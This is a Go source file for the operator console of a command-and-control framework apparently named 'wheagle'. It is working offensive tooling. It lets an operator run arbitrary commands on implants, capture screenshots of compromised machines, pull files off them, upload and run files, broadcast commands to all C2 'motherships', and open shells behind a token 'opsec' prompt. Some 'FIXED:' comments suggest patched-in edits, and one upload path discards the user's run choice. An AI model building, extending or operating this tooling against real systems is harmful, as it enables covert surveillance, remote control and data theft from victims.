/*
Copyright © 2023 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/alphamystic/odin/lib/penguins/zoo"
	"github.com/alphamystic/odin/lib/utils"
	"github.com/alphamystic/odin/wheagle/server/grpcapi"
	"github.com/alphamystic/odin/wheagle/server/lib"

	"github.com/cheggaaa/pb/v3"
	"github.com/spf13/cobra"
)

// FIXED: Dummy placeholder definitions stripped out entirely.
// Go now seamlessly references your actual global variables (Conns, RunningSessions, Drivers)
// defined natively inside cmd/sessions-man.go and cmd/rest.go.

// rootCmd represents the base command when called without any subcommands
var RootCmd = &cobra.Command{
	Use: "wheagle",
}

func init() {
	cmdCommander.Flags().String("cmnd", "cmnd", "Command for all implants")
	systemCommand.Flags().String("cmdType", "psh", "command shell type psh for powershell")
	cmdImplantInteract.Flags().String("id", ",pmoiuycfgvbih", "ID for implant to interact with.")
	cmdAdminInteract.Flags().String("id", "dfgl0i9u87uty", "ID for admin to interact with.")

	RootCmd.AddCommand(cmdCommander)
	RootCmd.AddCommand(cmdHelp)
	RootCmd.AddCommand(cmdStartMsf)
	RootCmd.AddCommand(cmdQuit)
	RootCmd.AddCommand(systemCommand)
	RootCmd.AddCommand(cmdImplantInteract)
	RootCmd.AddCommand(cmdAdminInteract)
}

var cmdImplantInteract = &cobra.Command{
	Use:   "im",
	Short: "Interact with a particular mule/minion",
	Run: func(cmd *cobra.Command, args []string) {
		var client = new(lib.AdminClientWrapper)
		var err error
		id, _ := cmd.Flags().GetString("id")

		ses, err := RunningSessions.GetSession(id)
		if err != nil {
			utils.Logerror(fmt.Errorf("Error getting implant with id: %s: %v", id, err))
			return
		}

		// FIXED: Extract safely using the modern structural layout mapping rules
		addrObj, exist := Conns.DoesConnectionExist(ses.Min.MothershipID)

		if (addrObj == nil || addrObj.OAddress == "") && !exist {
			utils.Warning(fmt.Sprintf("No connection to the specified address: %s", id))

			targetAddr := ""
			if addrObj != nil {
				targetAddr = addrObj.OAddress
			}
			client, err = lib.InitializeAdminClient(targetAddr, false)
			if err != nil {
				if CheckForNotAvailableImplant(err) {
					utils.PrintTextInASpecificColor("yellow", fmt.Sprintf("Implant with id %s not available in mothership", id))
				}
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v", err))
				return
			}
		} else {
			client, err = lib.InitializeAdminClient(addrObj.OAddress, false)
			if err != nil {
				if CheckForNotAvailableImplant(err) {
					utils.PrintTextInASpecificColor("yellow", fmt.Sprintf("Implant with id %s not available in mothership", id))
				}
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v", err))
				return
			}
		}

		utils.Interactor(id, false)
		fmt.Println("")
		var iarg string
		reader := bufio.NewReader(os.Stdin)
		for {
		START:
			fmt.Printf("[Implant-INTERACTOR]: ")
			if iarg, err = reader.ReadString('\n'); err != nil {
				utils.Logerror(err)
				continue
			}
			iarg = strings.TrimSpace(iarg)
			if iarg == "" {
				goto START
			}
			ags := strings.Fields(iarg)
			switch ags[0] {
			case "", " ":
				utils.PrintTextInASpecificColor("blue", "Error command can not be empty")
				goto START
			case "help":
				fmt.Println("HELp")
				goto START
			case "exit":
				var adminCommand = new(grpcapi.Command)
				ctx := context.Background()
				adminCommand.In = "exit"
				adminCommand.Individual = true
				adminCommand.UserId = id
				adminCommand, err = client.AClient.RunCommand(ctx, adminCommand)
				if err != nil {
					if CheckForNotAvailableImplant(err) {
						utils.PrintTextInASpecificColor("yellow", fmt.Sprintf("Implant with id %s not available in mothership", id))
					}
					utils.Logerror(fmt.Errorf("Error running client command: %v", err))
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
				fmt.Println(adminCommand.Out)
				if client.Conn != nil {
					if errs := client.Close(); errs != nil {
						if strings.Contains(fmt.Sprintf("%s", errs), "the client connection is closing") {
							return
						}
					}
				}
				goto END
			case "shell":
			case "back":
				goto END
			case "screenshot":
				var adminCommand = new(grpcapi.Command)
				adminCommand.UserId = id
				adminCommand.Individual = true
				adminCommand.In = "screenshot"
				screenshots, err := client.AClient.RunScreenShot(context.Background(), adminCommand)
				if err != nil {
					utils.Logerror(err)
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
				for _, screenshot := range screenshots.Screenshot {
					img, err := zoo.DecodeImage(screenshot)
					if err != nil {
						utils.PrintTextInASpecificColor("yellow", fmt.Sprintf("%s", err))
						continue
					}
					if err = os.MkdirAll("../bin/sreenshots/"+id+"/", 0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err)
						goto START
					}
					zoo.Save(img, "../bin/sreenshots/"+id+"/")
				}
				utils.PrintTextInASpecificColor("blue", "Finished writing screenshots to sreenshots/"+id)
			case "download":
				var fl *grpcapi.File
				var dir, name string
				fmt.Printf(`[+]    Enter directory to file in absolute form: `)
				fmt.Scanln(&dir)
				fmt.Printf("[+]    Enter name to save with locally: ")
				fmt.Scanln(&name)
				if !utils.CheckifStringIsEmpty(name) && !utils.CheckifStringIsEmpty(dir) {
					flmsg := &grpcapi.FileMessage{
						Name:      name,
						Directory: dir,
						UserId:    id,
					}
					if fl, err = client.AClient.ReceiveDownload(context.Background(), flmsg); err != nil {
						utils.Logerror(err)
						goto START
					}
					if err = os.MkdirAll("../bin/downloads/"+id+"/", 0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err)
						goto START
					}
					if err = os.WriteFile("../bin/downloads/"+id+"/"+fl.Name, fl.Data, 0750); err != nil {
						utils.Logerror(err)
						goto START
					}
					utils.PrintTextInASpecificColor("BLUE", "Downloaded file: bin/downloads/"+id+"/"+name)
					goto START
				} else {
					utils.PrintTextInASpecificColor("cyan", "Name or directory can not be empty.")
					goto START
				}
			case "upload":
				var fl = new(grpcapi.File)
				var run bool
				var name, dir, yn string
				fmt.Printf("[+]    Enter directory in absolute form: ")
				fmt.Scanln(&dir)
				fmt.Printf("[+]    Enter name to save with: ")
				fmt.Scanln(&name)
				fmt.Printf("[+] Save and run (Enter Yes or NO): ")
				fmt.Scanln(&yn)
				if !utils.CheckifStringIsEmpty(name) && !utils.CheckifStringIsEmpty(dir) {
					var rerr error
					fl.Data, rerr = ioutil.ReadFile(dir)
					if rerr != nil {
						utils.Logerror(rerr)
						goto START
					}
					fl.Name = name
					switch yn {
					case "Yes", "YES", "yes", "y", "Y":
						run = true
					default:
						run = false
					}
					fl.Run = run
					fl.UserId = id
					if _, err = client.AClient.SendUpload(context.Background(), fl); err != nil {
						utils.Logerror(err)
						goto START
					}
					goto START
				} else {
					utils.PrintTextInASpecificColor("cyan", "Name or directory can not be empty.")
					goto START
				}
			default:
				var adminCommand = new(grpcapi.Command)
				adminCommand.In = iarg
				adminCommand.UserId = id
				adminCommand.Individual = true
				ctx := context.Background()
				adminCommand, err = client.AClient.RunCommand(ctx, adminCommand)
				if err != nil {
					fmt.Println("There was an error.....")
					utils.Logerror(fmt.Errorf("Error running client command: %v", err))
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
				fmt.Println(adminCommand.Out)
				goto START
			}
		END:
			fmt.Println("Switching back to wheagle shell.")
			if client.Conn != nil {
				errs := client.Close()
				utils.Logerror(errs)
			}
			return
		}
	},
}

var cmdCommander = &cobra.Command{
	Use:   "al",
	Short: "Run a command to all motherships",
	Run: func(cmd *cobra.Command, args []string) {
		var err error
		imCmd, _ := cmd.Flags().GetString("cmnd")
		if imCmd != "" && len(imCmd) > 0 {
			c2s := Conns.GetAllConnectors()
			if len(c2s) <= 0 {
				fmt.Println("[-]    We have zero Motherships...........")
				return
			}
			var wg sync.WaitGroup
			wg.Add(len(c2s))
			for _, cn2 := range c2s {
				var client = new(lib.AdminClientWrapper)
				defer wg.Done()

				addrObj, _ := Conns.DoesConnectionExist(cn2.SessionId)
				if addrObj != nil {
					client, err = lib.InitializeAdminClient(addrObj.OAddress, false)
					if err != nil {
						utils.Logerror(errors.New(fmt.Sprintf("Unable to create a client to C2: %s\r\n ERROR: %s", cn2.OAddress, err)))
					}
					defer client.Close()

					var adminCommand = new(grpcapi.C2Command)
					adminCommand.Individual = false
					adminCommand.MSId = "ALL"
					adminCommand.In = imCmd
					ctx := context.Background()
					adminCommand, err = client.AClient.RunAC2Command(ctx, adminCommand)
					if err != nil {
						utils.Logerror(fmt.Errorf("Error running client command: %v", err))
					}
					fmt.Println("Output for: ", cn2.OAddress)
					fmt.Println(adminCommand.Out)
					fmt.Println("")
					utils.PrintTextInASpecificColorInBold("cyan", "--------------------------------------------------------")
				}
			}
			wg.Wait()
		}
	},
}

var cmdAdminInteract = &cobra.Command{
	Use:   "ia",
	Short: "Interact with a particular or a c2",
	Run: func(cmd *cobra.Command, args []string) {
		var client = new(lib.AdminClientWrapper)
		var err error
		id, err := cmd.Flags().GetString("id")
		if err != nil {
			utils.PrintTextInASpecificColor("red", "An Id is needed to connect to mothership.")
			utils.Logerror(err)
			return
		}

		addrObj, exist := Conns.DoesConnectionExist(id)
		if (addrObj == nil || addrObj.OAddress == "") && !exist {
			utils.Warning(fmt.Sprintf("No connection to the specified address: %s", id))
			targetAddr := ""
			if addrObj != nil {
				targetAddr = addrObj.OAddress
			}
			client, err = lib.InitializeAdminClient(targetAddr, false)
			if err != nil {
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v", err))
				return
			}
		} else {
			client, err = lib.InitializeAdminClient(addrObj.OAddress, false)
			if err != nil {
				utils.Logerror(fmt.Errorf("Unable to create a client to C2: %v", err))
				return
			}
		}

		var adminCommand = new(grpcapi.C2Command)
		adminCommand.Individual = true
		adminCommand.MSId = id
		utils.Interactor(id, true)

		var pass string
		fmt.Printf("Enter password to interact with C2: ")
		fmt.Scanln(&pass)
		var auth = new(grpcapi.Auth)
		auth.UserId = pass
		auth.MSId = id
		fmt.Println("     Authenticating..................")
		auth, err = client.AClient.RunOperatorAuthentication(context.Background(), auth)
		if err != nil {
			if !auth.Authenticated {
				utils.Logerror(errors.New(auth.MSId))
				utils.Logerror(fmt.Errorf("Find your own C2."))
				if client.Conn != nil {
					errs := client.Close()
					utils.Logerror(errs)
				}
				return
			}
			utils.Logerror(fmt.Errorf("Internal grpc error. %v", err))
			if client.Conn != nil {
				errs := client.Close()
				utils.Logerror(errs)
			}
			return
		}
		utils.Notice("Authenticated..................")
		var iarg string
		reader := bufio.NewReader(os.Stdin)
		for {
		START:
			fmt.Printf("[ADMIN-INTERACTOR]: ")
			if iarg, err = reader.ReadString('\n'); err != nil {
				utils.Logerror(err)
				continue
			}
			iarg = strings.TrimSpace(iarg)
			if iarg == "" {
				goto START
			}
			ags := strings.Fields(iarg)
			switch ags[0] {
			case "", " ":
				utils.PrintTextInASpecificColor("blue", "Error command can not be empty")
				goto START
			case "help":
				fmt.Println("HELP")
			case "delete":
			case "download":
				var fl *grpcapi.File
				var dir, name string
				fmt.Printf(`[+]    Enter directory to file in absolute form: `)
				fmt.Scanln(&dir)
				fmt.Printf("[+]    Enter name to save with locally: ")
				fmt.Scanln(&name)
				if name != "" && dir != "" {
					flmsg := &grpcapi.FileMessage{
						Name:      name,
						Directory: dir,
					}
					if fl, err = client.AClient.AdminDownloadFile(context.Background(), flmsg); err != nil {
						utils.Logerror(err)
						goto START
					}
					if err = os.MkdirAll("../bin/downloads/"+id+"/", 0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err)
						goto START
					}
					if err = os.WriteFile("../bin/downloads/"+id+"/"+fl.Name, fl.Data, 0750); err != nil {
						utils.Logerror(err)
						goto START
					}
					utils.PrintTextInASpecificColor("BLUE", "Downloaded file: bin/downloads/"+id+"/"+name)
					goto START
				}
			case "upload":
				var fl = new(grpcapi.File)
				var run bool
				var name, dir, yn string
				fmt.Printf("[+]    Enter directory in absolute form: ")
				fmt.Scanln(&dir)
				fmt.Printf("[+]    Enter name to save with: ")
				fmt.Scanln(&name)
				fmt.Printf("[+] Save and run (Enter Yes or NO): ")
				fmt.Scanln(&yn)
				var rerr error
				fl.Data, rerr = ioutil.ReadFile(dir)
				if rerr != nil {
					utils.Logerror(rerr)
					goto START
				}
				fl.Name = name
				switch yn {
				case "Yes", "YES", "yes", "y", "Y":
					fl.Run = true
				default:
					fl.Run = false
				}
				fl.Run = run
				_, err = client.AClient.AdminSendFile(context.Background(), fl)
				if err != nil {
					utils.Logerror(err)
					goto START
				}
				goto START
			case "screenshot":
				adminCommand.In = "screenshot"
				screenshots, err := client.AClient.TakeAdminScreenShot(context.Background(), adminCommand)
				if err != nil {
					utils.Logerror(err)
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
				for _, screenshot := range screenshots.Screenshot {
					img, err := zoo.DecodeImage(screenshot)
					if err != nil {
						utils.PrintTextInASpecificColor("yellow", fmt.Sprintf("%s", err))
						continue
					}
					if err = os.MkdirAll("../bin/sreenshots/"+id+"/", 0750); err != nil && !os.IsExist(err) {
						utils.Logerror(err)
						goto START
					}
					zoo.Save(img, "../bin/sreenshots/"+id+"/")
				}
				goto START
			case "shell":
				if err = GoodOpsec(); err != nil {
					utils.Warning(fmt.Sprintf("%s", err))
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
			case "back":
				goto END
			default:
				adminCommand.In = iarg
				ctx := context.Background()
				adminCommand, err = client.AClient.RunAC2Command(ctx, adminCommand)
				if err != nil {
					utils.Logerror(fmt.Errorf("Error running client command: %v", err))
					if client.Conn != nil {
						errs := client.Close()
						utils.Logerror(errs)
					}
					return
				}
				fmt.Println(adminCommand.Out)
				goto START
			}
		END:
			if client.Conn != nil {
				errs := client.Close()
				utils.Logerror(errs)
			}
			fmt.Println("Switching back to wheagle shell.")
			return
		}
	},
}

var GoodOpsec = func() error {
	utils.PrintTextInASpecificColorInBold("yellow", "PRACTICE GOOD OPSEC")
	var adult string
	fmt.Println("[+] Confirm that you accept responsibility for operations configuration tasks.")
	fmt.Printf("[+] Do you accept: (enter YES or NO): ")
	fmt.Scanln(&adult)
	if adult != "YES" {
		return fmt.Errorf("operation rejected")
	}
	return nil
}

var CheckForNotAvailableImplant = func(e error) bool {
	return false
}

func init() {
	utils.PrintTextInASpecificColorInBold("white", "Initializing wheagle C2")
	count := 10
	bar := pb.StartNew(count)
	for i := 0; i < count; i++ {
		bar.Increment()
		time.Sleep(time.Millisecond)
	}
	bar.Finish()

	// FIXED: Removed the redundant command initialization calls that conflicted with rest.go definitions

	RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")

	// FIXED: Config properties setup mapped smoothly using package names space
	Conda.Dir = "../bin/temp/"
	Conda.Port = 33333
	Conda.Address = "0.0.0.0"
	Conda.Run = make(chan bool)

	RootCmd.AddCommand(cmdStartFileServer)
	RootCmd.AddCommand(cmdStopFileServer)
}